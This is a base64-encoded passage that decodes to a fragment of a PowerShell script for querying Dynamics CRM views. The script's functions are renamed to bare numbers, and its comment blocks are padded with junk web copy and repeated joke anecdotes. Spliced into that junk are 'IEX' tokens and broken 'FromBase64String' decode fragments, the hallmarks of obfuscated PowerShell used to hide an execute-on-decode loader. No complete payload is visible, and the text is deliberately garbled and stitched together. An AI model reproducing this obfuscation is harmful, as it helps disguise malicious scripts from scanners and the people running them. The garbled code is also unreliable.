kJCQkkdmlldyA9ICR2aWV3cy5Dcm1SZWNvcmRzWzBdCgkJCQl9CgkJCX0JCQoJCQllbHNlewoJCQkJdGhyb3cgIlZpZXdJRCBvciBWaWV3TmFtZSBpcyBudWxsLCBpbnB1dCBhIHZhbGlkIHZpZXcgbmFtZSBvciBWaWV3IElELiIKCQkJfQoJCX0KICAgICAgICAjIGlmIHRoZSB2aWV3IGhhcyBvd25lcmlkLCB0aGVuIGl0cyBVc2VyIERlZmluZWQgVmlldwogICAgICAgIGlmKCRWaWV3Lm93bmVyaWQgLW5lICRudWxsKQogICAgICAgIHsKCQkJaWYoJFJ1bkFzVmlld093bmVyKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBTZXQtQ3JtQ29ubmVjdGlvbkNhbGxlcklkIC1jb25uICRjb25uIC1DYWxsZXJJZCAkdmlldy5vd25lcmlkX3Byb3BlcnR5LlZhbHVlLklkCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmKCRSdW5BcyAtbmUgJG51bGwpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFNldC1Dcm1Db25uZWN0aW9uQ2FsbGVySWQgLWNvbm4gJGNvbm4gLUNhbGxlcklkICRSdW5BcwogICAgICAgICAgICB9CiAgICAgICAgICAgCiAgICAgICAgICAgICMgR2V0IGFsbCByZWNvcmRzIGJ5IHVzaW5nIEZldGNoCiAgICAgICAgICAgIENybVRpbWVyU3RhcnQKICAgICAgICAgICAgJHJlY29yZHMgPSBHZXQtQ3JtUmVjb3Jkc0J5RmV0Y2ggLWNvbm4gJGNvbm4gLUZldGNoICRWaWV3LmZldGNoeG1sIC1BbGxSb3dzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1XYXJuaW5nQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAgICAgICAgICAgJHBlcmYgPSBDcm1UaW1lclN0b3AKICAgICAgICAgICAgJG93bmVyID0gJFZpZXcub3duZXJpZAogICAgICAgICAgICAkdG90YWxDb3VudCA9ICRyZWNvcmRzLkNvdW50ICAgICAgICAgICAKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsgICAgICAgICAgICAKICAgICAgICAgICAgaWYoJFJ1bkFzIC1uZSAkbnVsbCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgU2V0LUNybUNvbm5lY3Rpb25DYWxsZXJJZCAtY29ubiAkY29ubiAtQ2FsbGVySWQgJFJ1bkFzICAgICAgICAgICAgICAgIAogICAgICAgICAgICB9CiAgICAgICAgICAgIAoJCQkjIEdldCBhbGwgcmVjb3JkcyBieSB1c2luZyBGZXRjaAogICAgICAgICAgICBDcm1UaW1lclN0YXJ0CiAgICAgICAgICAgICRyZWNvcmRzID0gR2V0LUNybVJlY29yZHNCeUZldGNoIC1jb25uICRjb25uIC1GZXRjaCAkVmlldy5mZXRjaHhtbCAtQWxsUm93cyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtV2FybmluZ0FjdGlvbiBTaWxlbnRseUNvbnRpbnVlCiAgICAgICAgICAgICRwZXJmID0gQ3JtVGltZXJTdG9wCiAgICAgICAgICAgICRvd25lciA9ICJTeXN0ZW0iCiAgICAgICAgICAgICR0b3RhbENvdW50ID0gJHJlY29yZHMuQ291bnQKICAgICAgICB9CiAgICAgICAgCgkJIyBDcmVhdGUgcmVzdWx0IHNldAogICAgICAgICRwc29iaiA9IE5ldy1PYmplY3QgLVR5cGVOYW1lIFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNPYmplY3QKCSAgICBBZGQtTWVtYmVyIC1JbnB1dE9iamVjdCAkcHNvYmogLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJWaWV3TmFtZSIgLVZhbHVlICRWaWV3Lm5hbWUgCgkgICAgQWRkLU1lbWJlciAtSW5wdXRPYmplY3QgJHBzb2JqIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiRmV0Y2hYbWwiIC1WYWx1ZSAkVmlldy5mZXRjaHhtbCAKCSAgICBBZGQtTWVtYmVyIC1JbnB1dE9iamVjdCAkcHNvYmogLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJFbnRpdHkiIC1WYWx1ZSAkVmlldy5yZXR1cm5lZHR5cGVjb2RlCgkgICAgQWRkLU1lbWJlciAtSW5wdXRPYmplY3QgJHBzb2JqIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiQ29sdW1ucyIgLVZhbHVlIChbeG1sXSR2aWV3LmxheW91dHhtbCkuZ3JpZC5yb3cuY2VsbC5Db3VudAoJICAgIEFkZC1NZW1iZXIgLUlucHV0T2JqZWN0ICRwc29iaiAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIkxheW91dFhtbCIgLVZhbHVlICR2aWV3LmxheW91dHhtbAoJICAgIEFkZC1NZW1iZXIgLUlucHV0T2JqZWN0ICRwc29iaiAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgIlRvdGFsUmVjb3JkcyIgLVZhbHVlICR0b3RhbENvdW50CgkgICAgQWRkLU1lbWJlciAtSW5wdXRPYmplY3QgJHBzb2JqIC1NZW1iZXJUeXBlIE5vdGVQcm9wZXJ0eSAtTmFtZSAiT3duZXIiIC1WYWx1ZSAkb3duZXIKICAgICAgICBBZGQtTWVtYmVyIC1JbnB1dE9iamVjdCAkcHNvYmogLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICJQZXJmb3JtYW5jZSIgLVZhbHVlICRwZXJmCgkJCgkJI0lFWCByZXR1cm5pbmcgYWx3YXlzIHNldCBjb25uZWN0aW9uIGNhbGxlciBpZCBiYWNrIHRvIG91cnNlbGY6IAogICAgICAgIGlmKCRSdW5BcyAtb3IgJFJ1bkFzVmlld093bmVyKXsKCQkJV3JpdGUtVmVyYm9zZSAiU2V0dGluZyBjb25uZWN0aW9uIGNhbGxlciBpZCBiYWNrIHRvIGN1cnJlbnQgdXNlciIKCQkJU2V0LUNybUNvbm5lY3Rpb25DYWxsZXJJZCAtY29ubiAkY29ubiAtQ2FsbGVySWQgJFJ1bkFzICAgICAgICAgICAgICAgIAoJCX0KCiAgICAgICAgJHBzb2JqICNpbXBsaWNpdGx5IHdyaXRlIHRvIHRoZSBvdXRwdXQgc3RyZWFtIAogICAgICAgIHJldHVybiAjcmV0dXJuIGNvbnRyb2wKICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgdGhyb3cKICAgIH0KfQoKIyMjIEludGVybmFsIEhlbHBlcnMgCmZ1bmN0aW9uIDEzewogICAgJHNjcmlwdDpjcm10aW1lciA9IE5ldy1PYmplY3QgLVR5cGVOYW1lICdTeXN0ZW0uRGlhZ25vc3RpY3MuU3RvcHdhdGNoJwogICAgJHNjcmlwdDpjcm10aW1lci5TdGFydCgpCn0KPCM+PgpTcD1lbGxpbmcgYW5kIGMoKQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSBjKCkgb3IgcHJhY3RpY2UgZm9yIHIoKSBiZWVzLiBJZiBhbiBxKCkgd29yZCBvKCksIHAoKSB1cCB0aGUgbWVhbmluZyB3aWxsIGhlbHAgc3R1ZGVudHMgaW5jcmVhc2UgdGhlIG51bWJlciBvZiB3b3JkcyB0aGV5IGtub3cuIFdvcmtpbmcgd2l0aCBhIHBhcnRuZXIsIHN0dWRlbnRzIGNhbiB0ZXN0IGVhY2ggb3RoZXIgb24gdGhlIHIoKSBmb3IgdGhlIHJhbmRvbWl6ZWQgd29yZHMgbSgpZC4KCk5hbWUgSW5zcGlyYXRpb24KSWYgeW91IG5lZWQgdG8gY3JlYXRlIGEgbmFtZSBmb3IgYSBwcm9kdWN0LCBhbiBldmVudCwgYSBiYW5kIG9yIGZvciBhbnl0aGluZyBlbHNlLCB0aGlzIHRvb2wgY2FuIGJlIHF1aXRlIGhlbHBmdWwuIEFzIHlvdSBjb25zaWRlciBuYW1lcywgbSgpIGEgbnVtYmVyIG9mIHJhbmRvbSB3b3JkcyBhbmQgc2VlIGhvdyB0aGV5IGltcGFjdCB3aGF0IHlvdSBoYXZlIGFscmVhZHkgY29tZSB1cCB3aXRoLiBJbnB1dHRpbmcgdW5pcXVlIHdvcmRzIHlvdSBtYXkgbm90IGhhdmUgY29uc2lkZXJlZCBjYW4gc3BhcmsgYWRkaXRpb25hbCBjcmVhdGl2aXR5IHRvIGV2ZW50dWFsbHkgaGVscCB5b3UgcHJvZHVjZSB0aGUgcGVyZmVjdCBuYW1lIGZvciB5b3VyIHByb2plY3QuIElmIHlvdSdyZSBwKCkgZm9yIGdvb2QgY2hhcmFjdGVyIG5hbWVzIG9yIGJhYnkgbmFtZXMsIHlvdSBtaWdodCBiZSBpbnRlcmVzdGVkIGluIG91ciByYW5kb20gbmFtZSBnZW5lcmF0b3IuCgpUaGUgYWJvdmUgbGlzdCBpcyBub3QgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyguIFRoZXJlIGFyZSBsaXRlcmFsbHkgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggb2Ygd2F5cyB0aGUgUmFuZG9tIFdvcmQgR2VuZXJhdG9yIGNhbiBiZSB1c2VkLiBQbGVhc2UgZmVlbCBmcmVlIHRvIHNoYXJlIHRoZSB3YXkgeW91IHVzZSB0aGlzIHRvb2wsIGFuZCB3ZSBhbHdheXMgd2VsY29tZSBzdWdnZXN0aW9ucyBvbiBob3cgd2UgY2FuIGltcHJvdmUgaXQgdG8gc2VydmUgeW91IGJldHRlci4gV2UgYXJlIGFsc28gaW50ZXJlc3RlZCBpbiBuZXcgd29yZCBnZW5lcmF0b3JzIHlvdSdkIGJlIGludGVyZXN0ZWQgaW4gdXMgY3JlYXRpbmcuIE1hbnkgb2YgdGhlIHRvb2xzIG9uIHRoaXMgd2Vic2l0ZSBjYW1lIGZyb20gaWRlYXMgZnJvbSBwZW9wbGUgbGlrZSB5b3Ugd2hvIGNvbnRhY3RlZCB1cy4gUGxlYXNlIHRha2UgdGhlIHRpbWUgdG8gZXhwbG9yZSB0aGUgb3RoZXIgcmFuZG9tIGdlbmVyYXRvcnMgd2UgaGF2ZSBhdmFpbAoKIz48Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgcmVzdHJvb20gSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIHNvbWUgZ3JhZCBzdHVkZW50cyB3ZSBqKCkgZm9yIGFuIGYoKSBwcm9ncmFtLiBBZnRlciB3ZSBoYWQgYWxsIGhhZCBrKCkgZHJpbmtzLCBvbmUgb2YgdGhlIHN0dWRlbnRzIHNhaWQgdGhleSBkb250IGxpa2Ugc21va2VzIGJlY2F1c2UgdGhleSB0YXN0ZSBsaWtlIGEuIE15IGJvc3MgcmVwbGllZCwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBzbW9rZXMuIFNvIEkgY3V0IGluLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIGEuIEkgd2FzIGFza2VkIHRvIGxlYXZlLuKAnVNvdXJjZSM+CjwjVGhhdHMgRGVkaWNhdGlvblNvdXJjZSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgpmdW5jdGlvbiAxNHsKICAgICRjcm10aW1lcm9iaiA9IEdldC1WYXJpYWJsZSBjcm10aW1lciAtU2NvcGUgU2NyaXB0CiAgICBpZigkY3JtdGltZXJvYmouVmFsdWUgLW5lICRudWxsKQogICAgewogICAgICAgICRzY3JpcHQ6Y3JtdGltZXIgPSAkY3JtdGltZXJvYmouVmFsdWUKICAgICAgICAkc2NyaXB0OmNybXRpbWVyLlN0b3AoKQogICAgICAgICRwZXJmID0gIlRoZSBvcGVyYXRpb24gdG9vayAiICsgJHNjcmlwdDpjcm10aW1lci5FbGFwc2VkLlRvU3RyaW5nKCkKICAgICAgICBSZW1vdmUtVmFyaWFibGUgY3JtdGltZXIgIC1TY29wZSBTY3JpcHQKICAgICAgICByZXR1cm4gJHBlcmYKICAgIH0KfQo8Iz4+ClNwPWVsbGluZyBhbmQgYygpClRoaXMgdG9vbCBjYW4gYmUgYW4gZXhjZWxsZW50IHdheSB0byBpbXByb3ZlIGQoKSBvciBwcmFjdGljZSBmb3IgcigpIGJlZXMuIElmIGFuIHEoKSB3b3JkIG8oKSwgcCgpIHVwIHRoZSBtZWFuaW5nIHdpbGwgaGVscCBzdHVkZW50cyBpbmNyZWFzZSB0aGUgbnVtYmVyIG9mIHdvcmRzIHRoZXkga25vdy4gV29ya2luZyB3aXRoIGEgcGFydG5lciwgc3R1ZGVudHMgY2FuIHRlc3QgZWFjaCBvdGhlciBvbiB0aGUgcigpIGZvciB0aGUgcmFuZG9taXplZCB3b3JkcyBtKClkLgoKTmFtZSBJbnNwaXJhdGlvbgpJZiB5b3UgbmVlZCB0byBjcmVhdGUgYSBuYW1lIGZvciBhIHByb2R1Y3QsIGFuIGV2ZW50LCBhIGJhbmQgb3IgZm9yIGFueXRoaW5nIGVsc2UsIHRoaXMgdG9vbCBjYW4gYmUgcXVpdGUgaGVscGZ1bC4gQXMgeW91IGNvbnNpZGVyIG5hbWVzLCBtKCkgYSBudW1iZXIgb2YgcmFuZG9tIHdvcmRzIGFuZCBzZWUgaG93IHRoZXkgaW1wYWN0IHdoYXQgeW91IGhhdmUgYWxyZWFkeSBjb21lIHVwIHdpdGguIElucHV0dGluZyB1bmlxdWUgd29yZHMgeW91IG1heSBub3QgaGF2ZSBjb25zaWRlcmVkIGNhbiBzcGFyayBhZGRpdGlvbmFsIGNyZWF0aXZpdHkgdG8gZXZlbnR1YWxseSBoZWxwIHlvdSBwcm9kdWNlIHRoZSBwZXJmZWN0IG5hbWUgZm9yIHlvdXIgcHJvamVjdC4gSWYgeW91J3JlIHAoKSBmb3IgZ29vZCBjaGFyYWN0ZXIgbmFtZXMgb3IgYmFieSBuYW1lcywgeW91IG1pZ2h0IGJlIGludGVyZXN0ZWQgaW4gb3VyIHJhbmRvbSBuYW1lIGdlbmVyYXRvci4KClRoZSBhYm92ZSBsaXN0IGlzIG5vdCBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKC4gVGhlcmUgYXJlIGxpdGVyYWxseSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCBvZiB3YXlzIHRoZSBSYW5kb20gV29yZCBHZW5lcmF0b3IgY2FuIGJlIHVzZWQuIFBsZWFzZSBmZWVsIGZyZWUgdG8gc2hhcmUgdGhlIHdheSB5b3UgdXNlIHRoaXMgdG9vbCwgYW5kIHdlIGFsd2F5cyB3ZWxjb21lIHN1Z2dlc3Rpb25zIG9uIGhvdyB3ZSBjYW4gaW1wcm92ZSBpdCB0byBzZXJ2ZSB5b3UgYmV0dGVyLiBXZSBhcmUgYWxzbyBpbnRlcmVzdGVkIGluIG5ldyB3b3JkIGdlbmVyYXRvcnMgeW91J2QgYmUgaW50ZXJlc3RlZCBpbiB1cyBjcmVhdGluZy4gTWFueSBvZiB0aGUgdG9vbHMgb24gdGhpcyB3ZWJzaXRlIGNhbWUgZnJvbSBpZGVhcyBmcm9tIHBlb3BsZSBsaWtlIHlvdSB3aG8gY29udGFjdGVkIHVzLiBQbGVhc2UgdGFrZSB0aGUgdGltZSB0byBleHBsb3JlIHRoZSBvdGhlciByYW5kb20gZ2VuZXJhdG9ycyB3ZSBoYXZlIGF2YWlsCgojPjwjPuKAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIHJlc3Ryb29tIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSByZXN0cm9vbSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KPCM+4oCcSSB3YXMgYXQgYSBzd2FuayBiYXIgZm9yIGEgd29yayBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCwgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZyggc29tZSBncmFkIHN0dWRlbnRzIHdlIGooKSBmb3IgYW4gZigpIHByb2dyYW0uIEFmdGVyIHdlIGhhZCBhbGwgaGFkIGsoKSBkcmlua3MsIG9uZSBvZiB0aGUgc3R1ZGVudHMgc2FpZCB0aGV5IGRvbnQgbGlrZSBzbW9rZXMgYmVjYXVzZSB0aGV5IHRhc3RlIGxpa2UgYS4gTXkgYm9zcyByZXBsaWVkLCBtYXliZSB5b3UgaGF2ZW50IGhhZCBnb29kIHNtb2tlcy4gU28gSSBjdXQgaW4sIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2QgYS4gSSB3YXMgYXNrZWQgdG